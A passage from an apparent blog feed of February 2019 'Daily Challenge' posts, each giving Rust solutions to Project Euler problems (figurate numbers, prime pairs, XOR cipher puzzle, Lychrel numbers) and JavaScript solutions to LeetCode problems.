[5,5,10,10,20]Output: falseExplanation: From the first two customers in order, we collect two $5 bills.For the next two customers in order, we collect a $10 bill and give back a $5 bill.For the last customer, we can&apos;t give change of $15 back because we only have two $10 bills.Since not every customer received correct change, the answer is false. Note: 0 &lt;= bills.length &lt;= 10000 bills[i] will be either 5, 10, or 20. SolutionNothing to say. Implementation123456789101112131415161718192021222324252627/** * @param &#123;number[]&#125; bills * @return &#123;boolean&#125; */var lemonadeChange = function(bills) &#123; let five = 0; let ten = 0; for (const bill of bills) &#123; if (bill === 5) &#123; five += 1; &#125; else if (bill === 10) &#123; if (five === 0) return false; five -= 1; ten += 1; &#125; else &#123; if (ten === 0) &#123; if (five &lt; 3) return false; five -= 3; &#125; else &#123; if (five === 0) return false; five -= 1; ten -= 1; &#125; &#125; &#125; return true;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-19 Daily Challenge]]></title>
    <url>%2F2019-02-19-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Cyclical figurate numbers in Rust and Binary Tree Cameras in JavaScript. MathProblemCyclical figurate numbersProblem 61Triangle, square, pentagonal, hexagonal, heptagonal, and octagonal numbers are all figurate (polygonal) numbers and are generated by the following formulae:|type|formula|numbers|| ---------- | -------------------- | --------------------- || Triangle | P3,n=n(n+1)/2 | 1, 3, 6, 10, 15, ... || Square | P4,n=n2 | 1, 4, 9, 16, 25, ... || Pentagonal | P5,n=n(3n−1)/2 | 1, 5, 12, 22, 35, ... || Hexagonal | P6,n=n(2n−1) | 1, 6, 15, 28, 45, ... || Heptagonal | P7,n=n(5n−3)/2 | 1, 7, 18, 34, 55, ... || Octagonal | P8,n=n(3n−2) | 1, 8, 21, 40, 65, ... | The ordered set of three 4-digit numbers: 8128, 2882, 8281, has three interesting properties. The set is cyclic, in that the last two digits of each number is the first two digits of the next number (including the last number with the first). Each polygonal type: triangle (P3,127=8128), square (P4,91=8281), and pentagonal (P5,44=2882), is represented by a different number in the set. This is the only set of 4-digit numbers with this property. Find the sum of the only ordered set of six cyclic 4-digit numbers for which each polygonal type: triangle, square, pentagonal, hexagonal, heptagonal, and octagonal, is represented by a different number in the set. SolutionDFS is ok. BTW, before I wrote the right code, I wrote some shit. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566use std::collections::HashMap;fn main() &#123; let mut num: HashMap&lt;i32, u8&gt; = HashMap::new(); let mut ans: [i32; 6] = [0; 6]; let mut t = 10; loop &#123; let tmp = t * (t + 1) / 2; if tmp &gt; 9999 &#123; break; &#125; special_insert(&amp;mut num, tmp, 1); special_insert(&amp;mut num, t*t, 1&lt;&lt;1); special_insert(&amp;mut num, t*(3*t-1)/2, 1&lt;&lt;2); special_insert(&amp;mut num, t*(2*t-1), 1&lt;&lt;3); special_insert(&amp;mut num, t*(5*t-3)/2, 1&lt;&lt;4); special_insert(&amp;mut num, t*(3*t-2), 1&lt;&lt;5); t += 1; &#125; for (n, bitmask) in &amp;num &#123; if n % 100 &lt; 10 &#123; continue; &#125; ans[0] = *n; if dfs(*n, *bitmask, 1, &amp;num, &amp;mut ans) &#123; break; &#125; &#125; println!("Answer is &#123;:?&#125;", ans); println!("Sum of it is &#123;&#125;", ans.iter().fold(0, |a, &amp;b| a + b));&#125;fn special_insert(map: &amp;mut HashMap&lt;i32, u8&gt;, n: i32, bitmask: u8) &#123; if n &lt; 1000 || n &gt; 9999 &#123; return &#125; if map.contains_key(&amp;n) &#123; let tmp = map.get(&amp;n).unwrap(); map.insert(n, tmp | bitmask); &#125; else &#123; map.insert(n, bitmask); &#125;&#125;fn dfs(cur: i32, bitmask: u8, size: usize, map: &amp;HashMap&lt;i32, u8&gt;, mut ans: &amp;mut [i32]) -&gt; bool &#123; if size == 6 &#123; return ans[0] / 100 == ans[5] % 100; &#125; let tmp = cur % 100 * 100; for i in 10..100 &#123; let tmp = tmp + i; if map.contains_key(&amp;tmp) &#123; let mask = map.get(&amp;tmp).unwrap(); for i in 0..6 &#123; let tp = 1 &lt;&lt; i; if bitmask &amp; tp == 0 &amp;&amp; mask &amp; tp != 0 &#123; ans[size] = tmp; if dfs(tmp, bitmask | tp, size + 1, &amp;map, &amp;mut ans) &#123; return true; &#125; &#125; &#125; &#125; &#125; false&#125; AlgorithmProblem968. Binary Tree CamerasGiven a binary tree, we install cameras on the nodes of the tree. Each camera at a node can monitor its parent, itself, and its immediate children. Calculate the minimum number of cameras needed to monitor all nodes of the tree. Example 1: 123Input: [0,0,null,0,0]Output: 1Explanation: One camera is enough to monitor all nodes if placed as shown. Example 2: 123Input: [0,0,null,0,null,0,null,null,0]Output: 2Explanation: At least two cameras are needed to monitor all nodes of the tree. The above image shows one of the valid configurations of camera placement. Note: The number of nodes in the given tree will be in the range [1, 1000]. Every node has value 0. SolutionGreedy algorithm is capable for this. We begin with bottom, where all children are null, we first mark null been monitored, if and only if the node&#39;s child is not monitored, or this node is root and is not monitored, we need to put a camera on it. Implementation1234567891011121314151617181920212223242526272829303132/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number&#125; */var minCameraCover = function(root) &#123; let ans = 0; let set = new Set(); set.add(null); const dfs = (node, parent) =&gt; &#123; if (node !== null) &#123; dfs(node.left, node); dfs(node.right, node); if ((parent === null &amp;&amp; !set.has(node)) || !set.has(node.left) || !set.has(node.right)) &#123; ans += 1; set.add(node); set.add(parent); set.add(node.left); set.add(node.right); &#125; &#125; &#125;; dfs(root, null); return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-18 Daily Challenge]]></title>
    <url>%2F2019-02-18-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Prime pair sets in Rust and Generate Parentheses in JavaScript. MathProblemPrime pair setsProblem 60The primes 3, 7, 109, and 673, are quite remarkable. By taking any two primes and concatenating them in any order the result will always be prime. For example, taking 7 and 109, both 7109 and 1097 are prime. The sum of these four primes, 792, represents the lowest sum for a set of four primes with this property. Find the lowest sum for a set of five primes for which any two primes concatenate to produce another prime. SolutionBrute force. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364extern crate primal;use primal::Sieve;fn main() &#123; let sieve: Sieve = Sieve::new(1_000_000_000); let mut ans = 0; let mut found = false; let mut cur = sieve.prime_pi(673); let mut buf: [usize; 5] = [0; 5]; while !found &#123; buf[0] = sieve.nth_prime(cur); match dfs(1, cur, &amp;mut buf, &amp;sieve) &#123; true =&gt; found = true, false =&gt; cur += 1, &#125; &#125; println!("&#123;:?&#125;", buf); for i in &amp;buf &#123; ans += i; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn dfs(n: usize, index: usize, mut buf: &amp;mut [usize], sieve: &amp;Sieve) -&gt; bool &#123; if n == 5 &#123; return true; &#125; // if n == 4 &#123; // println!("&#123;:?&#125;", buf); // &#125; for i in (2..index).rev() &#123; let tmp = sieve.nth_prime(i); if test_it(n, tmp, &amp;buf, &amp;sieve) &#123; buf[n] = tmp; if dfs(n+1, i, &amp;mut buf, &amp;sieve) &#123; return true &#125; &#125; &#125; false&#125;fn test_it(index: usize, num: usize, buf: &amp;[usize], sieve: &amp;Sieve) -&gt; bool &#123; for i in 0..index &#123; if !(sieve.is_prime(append_num(num, buf[i]))&amp;&amp;sieve.is_prime(append_num(buf[i], num))) &#123; return false; &#125; &#125; true&#125;fn append_num(mut left: usize, mut right: usize) -&gt; usize &#123; let mut tmp = 0; while right != 0 &#123; tmp = tmp * 10 + right % 10; right /= 10; &#125; while tmp != 0 &#123; left = left * 10 + tmp % 10; tmp /= 10; &#125; left&#125; AlgorithmProblem22. Generate ParenthesesGiven n pairs of parentheses, write a function to generate all combinations of well-formed parentheses. For example, given n = 3, a solution set is: 1234567[ &quot;((()))&quot;, &quot;(()())&quot;, &quot;(())()&quot;, &quot;()(())&quot;, &quot;()()()&quot;] SolutionSolve it recursively. Implementation123456789101112var generateParenthesis = function(n) &#123; if (n === 0) return [""]; let ans = []; for (let i = 0; i &lt; n; i += 1) &#123; for (const left of generateParenthesis(i)) &#123; for (const right of generateParenthesis(n-1-i))&#123; ans.push(`($&#123;left&#125;)$&#123;right&#125;`); &#125; &#125; &#125; return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-17 Daily Challenge]]></title>
    <url>%2F2019-02-17-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is XOR decryption in Rust and Sort List in JavaScript. MathProblemXOR decryptionProblem 59 Please note that the file associated with this problem, p059_cipher.txt, was changed on Tuesday 5 February 2019. If you downloaded the file before this date, please download the new version. This notice will remain for seven days. Each character on a computer is assigned a unique code and the preferred standard is ASCII (American Standard Code for Information Interchange). For example, uppercase A = 65, asterisk (*) = 42, and lowercase k = 107. A modern encryption method is to take a text file, convert the bytes to ASCII, then XOR each byte with a given value, taken from a secret key. The advantage with the XOR function is that using the same encryption key on the cipher text, restores the plain text; for example, 65 XOR 42 = 107, then 107 XOR 42 = 65. For unbreakable encryption, the key is the same length as the plain text message, and the key is made up of random bytes. The user would keep the encrypted message and the encryption key in different locations, and without both &quot;halves&quot;, it is impossible to decrypt the message. Unfortunately, this method is impractical for most users, so the modified method is to use a password as a key. If the password is shorter than the message, which is likely, the key is repeated cyclically throughout the message. The balance for this method is using a sufficiently long password key for security, but short enough to be memorable. Your task has been made easy, as the encryption key consists of three lower case characters. Using p059_cipher.txt (right click and &#39;Save Link/Target As...&#39;), a file containing the encrypted ASCII codes, and the knowledge that the plain text must contain common English words, decrypt the message and find the sum of the ASCII values in the original text. SolutionMTP hahaha. Simply assume that space is most character~ Implementation12345678910111213141516171819202122232425262728293031323334353637fn main() &#123; let cipher: [u8; 1455] = [36,22,80,0,0,4,23,25,19,17,88,4,4,19,21,11,88,22,23,23,29,69,12,24,0,88,25,11,12,2,10,28,5,6,12,25,10,22,80,10,30,80,10,22,21,69,23,22,69,61,5,9,29,2,66,11,80,8,23,3,17,88,19,0,20,21,7,10,17,17,29,20,69,8,17,21,29,2,22,84,80,71,60,21,69,11,5,8,21,25,22,88,3,0,10,25,0,10,5,8,88,2,0,27,25,21,10,31,6,25,2,16,21,82,69,35,63,11,88,4,13,29,80,22,13,29,22,88,31,3,88,3,0,10,25,0,11,80,10,30,80,23,29,19,12,8,2,10,27,17,9,11,45,95,88,57,69,16,17,19,29,80,23,29,19,0,22,4,9,1,80,3,23,5,11,28,92,69,9,5,12,12,21,69,13,30,0,0,0,0,27,4,0,28,28,28,84,80,4,22,80,0,20,21,2,25,30,17,88,21,29,8,2,0,11,3,12,23,30,69,30,31,23,88,4,13,29,80,0,22,4,12,10,21,69,11,5,8,88,31,3,88,4,13,17,3,69,11,21,23,17,21,22,88,65,69,83,80,84,87,68,69,83,80,84,87,73,69,83,80,84,87,65,83,88,91,69,29,4,6,86,92,69,15,24,12,27,24,69,28,21,21,29,30,1,11,80,10,22,80,17,16,21,69,9,5,4,28,2,4,12,5,23,29,80,10,30,80,17,16,21,69,27,25,23,27,28,0,84,80,22,23,80,17,16,17,17,88,25,3,88,4,13,29,80,17,10,5,0,88,3,16,21,80,10,30,80,17,16,25,22,88,3,0,10,25,0,11,80,12,11,80,10,26,4,4,17,30,0,28,92,69,30,2,10,21,80,12,12,80,4,12,80,10,22,19,0,88,4,13,29,80,20,13,17,1,10,17,17,13,2,0,88,31,3,88,4,13,29,80,6,17,2,6,20,21,69,30,31,9,20,31,18,11,94,69,54,17,8,29,28,28,84,80,44,88,24,4,14,21,69,30,31,16,22,20,69,12,24,4,12,80,17,16,21,69,11,5,8,88,31,3,88,4,13,17,3,69,11,21,23,17,21,22,88,25,22,88,17,69,11,25,29,12,24,69,8,17,23,12,80,10,30,80,17,16,21,69,11,1,16,25,2,0,88,31,3,88,4,13,29,80,21,29,2,12,21,21,17,29,2,69,23,22,69,12,24,0,88,19,12,10,19,9,29,80,18,16,31,22,29,80,1,17,17,8,29,4,0,10,80,12,11,80,84,67,80,10,10,80,7,1,80,21,13,4,17,17,30,2,88,4,13,29,80,22,13,29,69,23,22,69,12,24,12,11,80,22,29,2,12,29,3,69,29,1,16,25,28,69,12,31,69,11,92,69,17,4,69,16,17,22,88,4,13,29,80,23,25,4,12,23,80,22,9,2,17,80,70,76,88,29,16,20,4,12,8,28,12,29,20,69,26,9,69,11,80,17,23,80,84,88,31,3,88,4,13,29,80,21,29,2,12,21,21,17,29,2,69,12,31,69,12,24,0,88,20,12,25,29,0,12,21,23,86,80,44,88,7,12,20,28,69,11,31,10,22,80,22,16,31,18,88,4,13,25,4,69,12,24,0,88,3,16,21,80,10,30,80,17,16,25,22,88,3,0,10,25,0,11,80,17,23,80,7,29,80,4,8,0,23,23,8,12,21,17,17,29,28,28,88,65,75,78,68,81,65,67,81,72,70,83,64,68,87,74,70,81,75,70,81,67,80,4,22,20,69,30,2,10,21,80,8,13,28,17,17,0,9,1,25,11,31,80,17,16,25,22,88,30,16,21,18,0,10,80,7,1,80,22,17,8,73,88,17,11,28,80,17,16,21,11,88,4,4,19,25,11,31,80,17,16,21,69,11,1,16,25,2,0,88,2,10,23,4,73,88,4,13,29,80,11,13,29,7,29,2,69,75,94,84,76,65,80,65,66,83,77,67,80,64,73,82,65,67,87,75,72,69,17,3,69,17,30,1,29,21,1,88,0,23,23,20,16,27,21,1,84,80,18,16,25,6,16,80,0,0,0,23,29,3,22,29,3,69,12,24,0,88,0,0,10,25,8,29,4,0,10,80,10,30,80,4,88,19,12,10,19,9,29,80,18,16,31,22,29,80,1,17,17,8,29,4,0,10,80,12,11,80,84,86,80,35,23,28,9,23,7,12,22,23,69,25,23,4,17,30,69,12,24,0,88,3,4,21,21,69,11,4,0,8,3,69,26,9,69,15,24,12,27,24,69,49,80,13,25,20,69,25,2,23,17,6,0,28,80,4,12,80,17,16,25,22,88,3,16,21,92,69,49,80,13,25,6,0,88,20,12,11,19,10,14,21,23,29,20,69,12,24,4,12,80,17,16,21,69,11,5,8,88,31,3,88,4,13,29,80,22,29,2,12,29,3,69,73,80,78,88,65,74,73,70,69,83,80,84,87,72,84,88,91,69,73,95,87,77,70,69,83,80,84,87,70,87,77,80,78,88,21,17,27,94,69,25,28,22,23,80,1,29,0,0,22,20,22,88,31,11,88,4,13,29,80,20,13,17,1,10,17,17,13,2,0,88,31,3,88,4,13,29,80,6,17,2,6,20,21,75,88,62,4,21,21,9,1,92,69,12,24,0,88,3,16,21,80,10,30,80,17,16,25,22,88,29,16,20,4,12,8,28,12,29,20,69,26,9,69,65,64,69,31,25,19,29,3,69,12,24,0,88,18,12,9,5,4,28,2,4,12,21,69,80,22,10,13,2,17,16,80,21,23,7,0,10,89,69,23,22,69,12,24,0,88,19,12,10,19,16,21,22,0,10,21,11,27,21,69,23,22,69,12,24,0,88,0,0,10,25,8,29,4,0,10,80,10,30,80,4,88,19,12,10,19,9,29,80,18,16,31,22,29,80,1,17,17,8,29,4,0,10,80,12,11,80,84,86,80,36,22,20,69,26,9,69,11,25,8,17,28,4,10,80,23,29,17,22,23,30,12,22,23,69,49,80,13,25,6,0,88,28,12,19,21,18,17,3,0,88,18,0,29,30,69,25,18,9,29,80,17,23,80,1,29,4,0,10,29,12,22,21,69,12,24,0,88,3,16,21,3,69,23,22,69,12,24,0,88,3,16,26,3,0,9,5,0,22,4,69,11,21,23,17,21,22,88,25,11,88,7,13,17,19,13,88,4,13,29,80,0,0,0,10,22,21,11,12,3,69,25,2,0,88,21,19,29,30,69,22,5,8,26,21,23,11,94]; let key:[u8; 3] = [key(&amp;cipher, 0, 3), key(&amp;cipher, 1, 3), key(&amp;cipher, 2, 3)]; let plain_text = otp_decrypt(&amp;cipher, &amp;key); println!("Plain text is \n```\n&#123;&#125;\n```", plain_text); let mut ans = 0; for i in plain_text.chars() &#123; ans += i as i32; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn key(cipher: &amp;[u8], index: usize, length: usize) -&gt; u8 &#123; let mut max_cnt = 0; let mut ans = 0; for i in 97u8..123 &#123; let mut cnt = 0; for j in (index..cipher.len()).step_by(length) &#123; if cipher[j] ^ i == 32 &#123; cnt += 1; &#125; &#125; if cnt &gt; max_cnt &#123; max_cnt = cnt; ans = i; &#125; &#125; ans&#125;fn otp_decrypt(cipher: &amp;[u8], key: &amp;[u8]) -&gt; String &#123; let mut ans: String = String::new(); for i in 0..cipher.len() &#123; ans.push((cipher[i]^key[i%key.len()]) as char); &#125; ans&#125; AlgorithmProblem148. Sort ListSort a linked list in O(n log n) time using constant space complexity. Example 1: 12Input: 4-&gt;2-&gt;1-&gt;3Output: 1-&gt;2-&gt;3-&gt;4 Example 2: 12Input: -1-&gt;5-&gt;3-&gt;4-&gt;0Output: -1-&gt;0-&gt;3-&gt;4-&gt;5 Solutionsimple mergesort. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Definition for singly-linked list. * function ListNode(val) &#123; * this.val = val; * this.next = null; * &#125; *//** * @param &#123;ListNode&#125; head * @return &#123;ListNode&#125; */var sortList = function(head) &#123; if (head == null || head.next == null) return head; let prev = null; let mid = head; let end = head; while (end !== null &amp;&amp; end.next !== null) &#123; prev = mid; mid = mid.next; end = end.next.next; &#125; prev.next = null; const merge = (head1, head2) =&gt; &#123; let tmp_head = new ListNode; let cur = tmp_head; while (head1 !== null &amp;&amp; head2 !== null) &#123; if (head1.val &lt; head2.val) &#123; cur.next = head1; head1 = head1.next; &#125; else &#123; cur.next = head2; head2 = head2.next; &#125; cur = cur.next; &#125; while (head1 !== null) &#123; cur.next = head1; head1 = head1.next; cur = cur.next; &#125; while (head2 !== null) &#123; cur.next = head2; head2 = head2.next; cur = cur.next; &#125; return tmp_head.next; &#125;; let l1 = sortList(head); let l2 = sortList(mid); return merge(l1, l2);&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-16 Daily Challenge]]></title>
    <url>%2F2019-02-16-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Spiral primes in Rust and First Bad Version in JavaScript. MathProblemSpiral primesProblem 58Starting with 1 and spiralling anticlockwise in the following way, a square spiral with side length 7 is formed. 37 36 35 34 33 32 3138 17 16 15 14 13 3039 18 5 4 3 12 2940 19 6 1 2 11 2841 20 7 8 9 10 2742 21 22 23 24 25 2643 44 45 46 47 48 49 It is interesting to note that the odd squares lie along the bottom right diagonal, but what is more interesting is that 8 out of the 13 numbers lying along both diagonals are prime; that is, a ratio of 8/13 ≈ 62%. If one complete new layer is wrapped around the spiral above, a square spiral with side length 9 will be formed. If this process is continued, what is the side length of the square spiral for which the ratio of primes along both diagonals first falls below 10%? SolutionNothing to say. Implementation12345678910111213141516171819202122232425262728extern crate primal;use primal::Sieve;fn main() &#123; let sieve: Sieve = Sieve::new(1_000_000_000); let mut cur: usize = 1; let mut spiral: usize = 1; let mut prime: usize = 0; let bound = 0.1; let ans: usize; loop &#123; let ratio = prime as f64 / (spiral * 4 - 3) as f64; println!("&#123;&#125;, &#123;&#125;", spiral, ratio); if ratio &lt; bound &amp;&amp; spiral != 1 &#123; ans = spiral * 2 - 1; break; &#125; for _i in 0..4 &#123; cur += spiral * 2; if sieve.is_prime(cur) &#123; prime += 1; &#125; &#125; spiral += 1; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem278. First Bad VersionYou are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad. Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad. You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API. Example: 1234567Given n = 5, and version = 4 is the first bad version.call isBadVersion(3) -&gt; falsecall isBadVersion(5) -&gt; truecall isBadVersion(4) -&gt; trueThen 4 is the first bad version. SolutionSimple binary search. Implementation12345678910111213141516var solution = function(isBadVersion) &#123; /** * @param &#123;integer&#125; n Total versions * @return &#123;integer&#125; The first bad version */ return function(n) &#123; let begin = 1; let end = n; while (begin &lt; end) &#123; let mid = Math.floor((begin+end)/2); if (isBadVersion(mid)) end = mid; else begin = mid + 1; &#125; return begin; &#125;;&#125;; ;D]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-15 Daily Challenge]]></title>
    <url>%2F2019-02-15-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Square root convergents in Rust and Merge Intervals in JavaScript. MathProblemSquare root convergentsProblem 57It is possible to show that the square root of two can be expressed as an infinite continued fraction. √ 2 = 1 + 1/(2 + 1/(2 + 1/(2 + ... ))) = 1.414213... By expanding this for the first four iterations, we get: 1 + 1/2 = 3/2 = 1.51 + 1/(2 + 1/2) = 7/5 = 1.41 + 1/(2 + 1/(2 + 1/2)) = 17/12 = 1.41666...1 + 1/(2 + 1/(2 + 1/(2 + 1/2))) = 41/29 = 1.41379... The next three expansions are 99/70, 239/169, and 577/408, but the eighth expansion, 1393/985, is the first example where the number of digits in the numerator exceeds the number of digits in the denominator. In the first one-thousand expansions, how many fractions contain a numerator with more digits than denominator? SolutionCheck A000129/A001541/A002315 Implementation123456789101112131415161718192021222324252627282930313233343536373839extern crate num_bigint;extern crate num_traits;use num_bigint::BigInt;use num_traits::FromPrimitive;use std::mem::replace;fn main() &#123; let mut ans = 0; let mut den0: BigInt = FromPrimitive::from_i32(2).unwrap(); let mut den1: BigInt = FromPrimitive::from_i32(5).unwrap(); let mut num00: BigInt = FromPrimitive::from_i32(1).unwrap(); let mut num01: BigInt = FromPrimitive::from_i32(3).unwrap(); let mut num10: BigInt = FromPrimitive::from_i32(1).unwrap(); let mut num11: BigInt = FromPrimitive::from_i32(7).unwrap(); let six: BigInt = FromPrimitive::from_i32(6).unwrap(); let two: BigInt = FromPrimitive::from_i32(2).unwrap(); for i in 0..1000 &#123; let den_s = den0.to_str_radix(10).len(); let den2 = den0 + &amp;two * &amp;den1; den0 = replace(&amp;mut den1, den2); if i &amp; 1 == 0 &#123; let num02 = -num00 + &amp;six * &amp;num01; num00 = replace(&amp;mut num01, num02); let num_s = num00.to_str_radix(10).len(); if num_s &gt; den_s &#123; ans += 1; &#125; &#125; else &#123; let num12 = -num10 + &amp;six * &amp;num11; num10 = replace(&amp;mut num11, num12); let num_s = num10.to_str_radix(10).len(); if num_s &gt; den_s &#123; ans += 1; &#125; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem56. Merge IntervalsGiven a collection of intervals, merge all overlapping intervals. Example 1: 123Input: [[1,3],[2,6],[8,10],[15,18]]Output: [[1,6],[8,10],[15,18]]Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6]. Example 2: 123Input: [[1,4],[4,5]]Output: [[1,5]]Explanation: Intervals [1,4] and [4,5] are considered overlapping. SolutionNothing to say. Implementation1234567891011121314151617181920212223242526/** * Definition for an interval. * function Interval(start, end) &#123; * this.start = start; * this.end = end; * &#125; *//** * @param &#123;Interval[]&#125; intervals * @return &#123;Interval[]&#125; */var merge = function(intervals) &#123; let ans = []; if (!intervals.length) return ans; intervals.sort( (a, b) =&gt; a.start-b.start ); let cur = intervals[0]; for (let i = 1; i &lt; intervals.length; ++i) &#123; if (intervals[i].start &lt;= cur.end) cur.end = Math.max(cur.end, intervals[i].end); else &#123; ans.push(cur); cur = intervals[i]; &#125; &#125; ans.push(cur); return ans;&#125;; ;D]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-14 Daily Challenge]]></title>
    <url>%2F2019-02-14-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Powerful digit sum in Rust and Restore IP Addresses in JavaScript. MathProblemPowerful digit sumProblem 56A googol ($10^{100}$) is a massive number: one followed by one-hundred zeros; $100^{100}$ is almost unimaginably large: one followed by two-hundred zeros. Despite their size, the sum of the digits in each number is only 1. Considering natural numbers of the form, $a^b$, where a, b &lt; 100, what is the maximum digital sum? SolutionNothing to say. Implementation1234567891011121314151617181920extern crate num_bigint;extern crate num_traits;use num_bigint::&#123;BigUint&#125;;use num_traits::&#123;FromPrimitive&#125;;fn main() &#123; let mut ans = 0; for i in 1..101 &#123; let base: BigUint = FromPrimitive::from_usize(i).unwrap(); let mut tmp: BigUint = FromPrimitive::from_usize(i).unwrap(); for _j in 0..100 &#123; let sum = tmp.to_str_radix(10).chars() .fold(0, |a, b| a+b as usize - '0' as usize); ans = if ans &lt; sum &#123; sum &#125; else &#123; ans &#125;; tmp = tmp * &amp;base; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem93. Restore IP AddressesGiven a string containing only digits, restore it by returning all possible valid IP address combinations. Example: 12Input: &quot;25525511135&quot;Output: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;] SolutionSimple DFS. Implementation1234567891011121314151617181920212223242526/** * @param &#123;string&#125; s * @return &#123;string[]&#125; */var restoreIpAddresses = function(s) &#123; let ans = []; let arr = []; const isValid = (s) =&gt; &#123; return (+s &lt; 256) &amp;&amp; (+s+"" === s); &#125;; const dfs = (index, cursor) =&gt; &#123; // console.log(index, cursor, arr); if (index === 4 || cursor &gt;= s.length) &#123; if (cursor === s.length &amp;&amp; index === 4) ans.push(arr.join(".")); return; &#125; for (let i = 1; i &lt; 4; ++i) &#123; if (cursor+i &lt;= s.length &amp;&amp; isValid(s.substr(cursor, i))) &#123; arr[index] = s.substr(cursor, i); dfs(index+1, cursor+i); &#125; &#125; &#125;; dfs(0, 0); return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-13 Daily Challenge]]></title>
    <url>%2F2019-02-13-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Poker hands in Rust and Minimum Moves to Equal Array Elements in JavaScript. MathProblemLychrel numbersProblem 55If we take 47, reverse and add, 47 + 74 = 121, which is palindromic. Not all numbers produce palindromes so quickly. For example, 349 + 943 = 1292,1292 + 2921 = 42134213 + 3124 = 7337 That is, 349 took three iterations to arrive at a palindrome. Although no one has proved it yet, it is thought that some numbers, like 196, never produce a palindrome. A number that never forms a palindrome through the reverse and add process is called a Lychrel number. Due to the theoretical nature of these numbers, and for the purpose of this problem, we shall assume that a number is Lychrel until proven otherwise. In addition you are given that for every number below ten-thousand, it will either (i) become a palindrome in less than fifty iterations, or, (ii) no one, with all the computing power that exists, has managed so far to map it to a palindrome. In fact, 10677 is the first number to be shown to require over fifty iterations before producing a palindrome: 4668731596684224866951378664 (53 iterations, 28-digits). Surprisingly, there are palindromic numbers that are themselves Lychrel numbers; the first example is 4994. How many Lychrel numbers are there below ten-thousand? NOTE: Wording was modified slightly on 24 April 2007 to emphasise the theoretical nature of Lychrel numbers. SolutionNothing to say. Implementation12345678910111213141516171819202122232425262728293031323334353637383940fn main() &#123; let mut ans = 0; for i in 10..10_000 &#123; let mut tmp = i128::from(i); tmp += reverse(tmp); let mut cnt = 1; while cnt &lt; 50 &amp;&amp; !is_palindrome(tmp) &#123; cnt += 1; // println!("&#123;&#125;, &#123;&#125;, &#123;&#125;", i, tmp, reverse(tmp)); tmp += reverse(tmp); &#125; if cnt == 50 &#123; println!("&#123;&#125;", i); ans += 1; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_palindrome(n: i128) -&gt; bool &#123; let s = n.to_string(); // println!("&#123;&#125;",s); let s = s.as_bytes(); for i in 0..(s.len()/2) &#123; if s[i] != s[s.len()-1-i] &#123; return false; &#125; &#125; true&#125;fn reverse(mut n: i128) -&gt; i128 &#123; let mut ans = 0; while n!= 0 &#123; ans *= 10; ans += n%10; n /= 10; &#125; ans&#125; AlgorithmProblem81. Search in Rotated Sorted Array IISuppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,0,1,2,2,5,6] might become [2,5,6,0,0,1,2]). You are given a target value to search. If found in the array return true, otherwise return false. Example 1: 12Input: nums = [2,5,6,0,0,1,2], target = 0Output: true Example 2: 12Input: nums = [2,5,6,0,0,1,2], target = 3Output: false Follow up: This is a follow up problem to Search in Rotated Sorted Array, where nums may contain duplicates. Would this affect the run-time complexity? How and why? SolutionNothing to say. Implementation1234567891011/** * @param &#123;number[]&#125; nums * @param &#123;number&#125; target * @return &#123;boolean&#125; */var search = function(nums, 